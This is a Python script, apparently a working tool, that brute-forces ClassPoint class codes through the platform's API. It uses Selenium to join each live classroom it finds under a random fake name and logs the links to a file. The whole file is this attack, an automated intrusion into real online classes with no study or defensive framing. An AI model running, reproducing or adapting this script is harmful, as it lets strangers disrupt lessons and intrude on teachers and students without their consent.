from selenium.webdriver.chrome.options import Options
from selenium import webdriver
import requests
import random
import string
import time

options = Options()
options.add_argument("--log-level=3")

driver = webdriver.Chrome(options=options)

code = 0

with open("links.txt", "r") as f:
    code = int(f.read().split("\n")[-2].split("=")[-1]) + 1

codes = []

def open_link(c):
    try:
        driver.get(f"https://www.classpoint.app/?code={c}")
        # time.sleep(0.5)
        print(f"clicking confirm class code {c}")
        driver.find_element("xpath", '//*[@id="root"]/div/div[1]/div[3]/div/div/div[2]/div[2]/button').click()
        # time.sleep(0.5)
        print(f"entering name for class code {c}")
        driver.find_element("id", 'standard-basic').clear()
        driver.find_element("id", 'standard-basic').send_keys("".join(random.choices(string.ascii_letters, k=10)))
        # time.sleep(0.5)
        print(f"clicking join for class code {c}")
        driver.find_element("xpath", '//*[@id="root"]/div/div[1]/div[3]/div/div/div[4]/button').click()
        save_link(c)
        time.sleep(2)
    except:
        pass

def save_link(c):
    alr_saved_codes = []
    with open("links.txt", "r") as f:
        alr_saved_codes = f.read().split("\n")
    if f"https://www.classpoint.app/?code={c}" in alr_saved_codes:
        return
    with open("links.txt", "a") as f:
        f.write(f"https://www.classpoint.app/?code={c}\n")
    
while code < 99999:
    if requests.get(f"https://apitwo.classpoint.app/classcode/region/byclasscode?classcode={code}").status_code != 200:
        code += 1
        continue
    print(f"code found and opening: {code}")
    open_link(code)
    codes.append(code)
    code += 1

print(f"class codes found: {codes}")
